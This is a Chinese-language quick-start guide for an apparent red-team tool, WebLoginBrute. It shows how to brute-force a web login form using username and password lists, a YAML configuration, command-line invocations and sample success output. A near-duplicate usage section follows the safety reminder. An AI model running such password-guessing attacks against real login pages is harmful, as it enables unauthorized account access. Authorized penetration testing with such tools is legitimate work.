# 快速开始

本指南将带您在5分钟内完成一次基本的爆破测试。

## 1. 准备工作

在开始之前，请确保您已完成 [安装指南](./Installation.md) 中的所有步骤。

## 2. 准备目标和字典

### a. 目标登录页面
本次示例将使用 `https://redteamnotes.com/login` 作为演示目标。

### b. 准备字典文件
创建两个简单的文本文件：
- `users.txt`:
  ```
  test
  admin
  guest
  ```
- `passwords.txt`:
  ```
  test
  password
  123456
  ```

## 3. 编写配置文件

在项目根目录创建一个名为 `config.yaml` 的文件，并填入以下内容：

```yaml
# --- 核心配置 ---
# 登录表单所在的页面 URL
url: "https://redteamnotes.com/login"

# 表单提交的目标 URL，通常与登录页面相同或在表单的 action 属性中指定
action: "https://redteamnotes.com/login/authenticate"

# 用户名和密码字典的路径
users: "users.txt"
passwords: "passwords.txt"

# --- 结果判断 ---
# 登录失败时，页面中会包含的特征字符串
fail_string: "Invalid credentials"

# --- 性能配置 ---
# 并发线程数
threads: 5
```

> **提示**: `fail_string` 是判断登录是否失败的关键。请根据实际目标页面的返回内容进行设置。

## 4. 启动爆破

打开终端，确保您已激活虚拟环境，然后运行以下命令：

```bash
webloginbrute --config config.yaml
```

## 5. 查看结果

程序将开始执行爆破，您会在终端看到实时的进度和统计信息。

如果爆破成功，程序会高亮显示成功的用户名和密码，并自动停止。

```
...
[INFO] 尝试登录: test:test -> 失败
[INFO] 尝试登录: test:password -> 失败
[INFO] 登录成功: test:123456
...
```

至此，您已成功完成了一次基本的登录爆破！

## 下一步

- 探索 [配置详解](./Configuration.md) 以了解更多高级选项。
- 学习如何使用不同的 [对抗级别](./Aggression-Levels.md) 来应对不同的目标。

## 安全提醒

- 仅对授权的目标进行测试
- 遵守当地法律法规
- 不要用于非法用途
- 测试完成后及时清理进度文件

## 基本使用

### 1. 克隆项目
```bash
git clone https://github.com/RedteamNotes/WebLoginBrute.git
cd WebLoginBrute
```

### 2. 安装依赖
```bash
pip install -r requirements.txt
```

### 3. 准备字典
创建或下载用户名和密码字典文件。例如：
`users.txt`:
```
admin
user
guest
```
`passwords.txt`:
```
password
123456
admin
```

### 4. 运行爆破
**基本命令:**
```bash
webloginbrute \
    --url "https://redteamnotes.com/login" \
    --action "https://redteamnotes.com/login/authenticate" \
    --users "users.txt" \
    --passwords "passwords.txt" \
    --fail-string "Invalid credentials"
```

**使用配置文件:**
创建一个 `config.yaml` 文件:
```yaml
url: "https://redteamnotes.com/login"
action: "https://redteamnotes.com/login/authenticate"
users: "users.txt"
passwords: "passwords.txt"
fail_string: "Invalid credentials"
threads: 20
verbose: true
```
然后运行:
```bash
webloginbrute --config config.yaml
```

**找到正确密码后，程序将显示成功信息并退出。** 